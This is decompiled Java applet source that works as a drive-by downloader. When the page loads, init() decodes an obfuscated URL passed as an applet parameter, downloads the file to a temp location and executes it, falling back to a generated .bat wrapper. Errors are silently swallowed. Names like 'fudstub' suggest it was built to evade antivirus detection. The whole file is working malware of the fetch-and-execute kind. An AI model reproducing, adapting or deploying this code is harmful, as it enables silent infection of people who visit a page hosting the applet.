import java.net.URLConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Jappletim extends JApplet
{
    private static final long hebelulelu = 1L;
    
    public void egitimsart() {
        try {
            final byte[] fudstub = new byte[10240];
            final String dosyam = this.getParameter("exe");
            System.out.println("Link \u0130ndirilcek Udland\u0131 Kaan Taraf\u0131ndan " + dosyam);
            String ajdar = desifre.desifre(dosyam).substring(dosyam.lastIndexOf("."));
            ajdar = desifre.desifre(ajdar).toLowerCase();
            final File hataa = File.createTempFile("DieForme-Fire", ajdar);
            final FileOutputStream dowload = new FileOutputStream(hataa);
            final URL dowload2 = new URL(desifre.desifre(dosyam));
            final URLConnection uc = dowload2.openConnection();
            final BufferedInputStream is = new BufferedInputStream(uc.getInputStream());
            int DieForme;
            while ((DieForme = is.read(fudstub)) > 0) {
                dowload.write(fudstub, 0, DieForme);
            }
            dowload.close();
            try {
                Runtime.getRuntime().exec(hataa.getAbsolutePath());
            }
            catch (IOException e) {
                final File f = File.createTempFile(desifre.desifre("muz"), desifre.desifre(".bat"));
                f.createNewFile();
                final PrintWriter password = new PrintWriter(f);
                password.println("\"" + hataa.getAbsolutePath() + "\"");
                password.close();
                Runtime.getRuntime().exec(f.getAbsolutePath());
            }
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void init() {
        try {
            this.egitimsart();
        }
        catch (Exception e) {
            System.out.println(e);
        }
        super.init();
    }
}
